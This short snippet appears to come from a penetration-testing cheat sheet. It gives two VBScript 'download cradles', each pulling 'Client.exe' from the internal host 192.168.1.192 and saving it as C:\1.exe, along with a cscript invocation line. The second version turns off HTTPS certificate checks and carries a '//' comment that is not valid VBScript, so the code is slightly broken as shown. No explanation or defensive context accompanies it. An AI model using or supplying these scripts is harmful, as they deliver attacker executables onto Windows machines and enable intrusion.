	#1.vbs
```vb
Set Post = CreateObject("Msxml2.XMLHTTP")
Set Shell = CreateObject("Wscript.Shell")
Post.Open "GET","http://192.168.1.192/Client.exe",0
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile "C:\1.exe",2 
>cscript 1.vbs
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim http,ado
Set http = CreateObject("Msxml2.serverXMLHTTP")
http.SetOption 2,13056//忽略HTTPS错误
http.open "GET","http://192.168.1.192/Client.exe",False
http.send
Set ado = createobject("Adodb.Stream")
ado.Type = adTypeBinary
ado.Open
ado.Write http.responseBody
ado.SaveToFile "c:\1.exe"
ado.Close
```